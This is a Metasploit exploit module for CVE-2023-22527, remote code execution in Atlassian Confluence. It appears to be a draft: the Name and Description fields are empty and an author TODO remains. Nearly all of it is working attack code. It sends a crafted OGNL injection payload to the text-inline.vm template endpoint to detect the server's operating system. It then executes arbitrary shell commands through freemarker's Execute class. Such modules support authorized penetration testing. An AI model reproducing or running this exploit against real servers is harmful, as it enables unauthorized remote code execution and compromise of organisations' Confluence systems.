##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
        },
        'Author' => [
          # TODO: add the others
          'Spencer McIntyre'
        ],
        'References' => [
          ['CVE', '2023-22527'],
          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html']
        ],
        'DisclosureDate' => '2024-01-16', # Atlassian advisory released
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Linux / Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Payload' => { 'BadChars' => '"' }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Payload' => { 'BadChars' => '"' }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8090
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    confluence_version = get_confluence_version
    return CheckCode::Unknown unless confluence_version

    vprint_status("Detected Confluence version: #{confluence_version}")

    confluence_platform = get_confluence_platform
    unless confluence_platform
      return CheckCode::Safe('Failed to test OGNL injection.')
    end

    vprint_status("Detected target platform: #{confluence_platform}")
    CheckCode::Vulnerable('Successfully tested OGNL injection.')
  end

  def get_confluence_platform
    # this method gets the platform by exploiting CVE-2023-22527
    return @confluence_platform if @confluence_platform

    header = "X-#{Rex::Text.rand_text_alphanumeric(10..15)}"
    ognl = <<~OGNL.gsub(/^\s+/, '').tr("\n", '')
      @org.apache.struts2.ServletActionContext@getResponse().setHeader(
        '#{header}',
        (@java.lang.System@getProperty('os.name'))
      )
    OGNL
    res = inject_ognl(ognl)
    return nil unless res

    res.headers[header]
  end

  def get_confluence_version
    return @confluence_version if @confluence_version

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.action')
    )
    return nil unless res&.code == 200

    poweredby = res.get_xml_document.xpath('//ul[@id="poweredby"]/li[@class="print-only"]/text()').first&.text
    return nil unless poweredby =~ /Confluence (\d+(\.\d+)*)/

    @confluence_version = Rex::Version.new(Regexp.last_match(1))
    @confluence_version
  end

  def exploit
    confluence_platform = get_confluence_platform
    unless confluence_platform
      fail_with(Failure::NotVulnerable, 'The target is not vulnerable.')
    end

    unless confluence_platform.downcase.start_with?('win') == (target['Platform'] == 'win')
      fail_with(Failure::NoTarget, "The target platform '#{confluence_platform}' is incompatible with '#{target.name}'")
    end

    print_status("Executing #{payload_instance.refname} (#{target.name})")
    execute_command(payload.encoded)
  end

  def execute_command(cmd, _opts = {})
    ognl = <<~OGNL.gsub(/^\s+/, '').tr("\n", '')
      (new freemarker.template.utility.Execute()).exec({"sh -c $@|sh . echo #{cmd}"})
    OGNL
    inject_ognl(ognl)
  end

  def inject_ognl(ognl, opts = {})
    param = rand_text_alphanumeric(6..10)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'template/aui/text-inline.vm'),
      'vars_post' => {
        'label' => "\\u0027+#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.#{param},{})+\\u0027",
        param => ognl
      }
    }.merge(opts))
  end
end
